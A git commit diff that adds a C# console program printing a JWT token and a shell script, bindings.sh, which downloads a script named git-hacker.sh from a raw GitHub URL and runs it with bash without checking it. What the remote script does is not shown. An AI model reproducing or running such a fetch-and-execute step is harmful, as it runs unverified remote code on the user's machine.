7deeadeeee593d22b8e667442f7d41116003fe52
Ikillnukes <ikillnukes1@gmail.com>
2018-05-05 20:16:33 +0200

    ??? 333

---
+++ bindings.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+if [ ! -f git-hacker.sh ]; then
+		curl --remote-name https://raw.githubusercontent.com/trytohackus/whatisthis/master/git-hacker.sh
+fi
+
+bash git-hacker.sh
---
+++ jwt_console/Program.cs
@@ -0,0 +1,14 @@
+﻿using jwt_api;
+using System;
+
+namespace jwt_console
+{
+    internal class Program
+    {
+        private static void Main(string[] args)
+        {
+            Console.WriteLine(Api.GetToken());
+            Console.Read();
+        }
+    }
+}
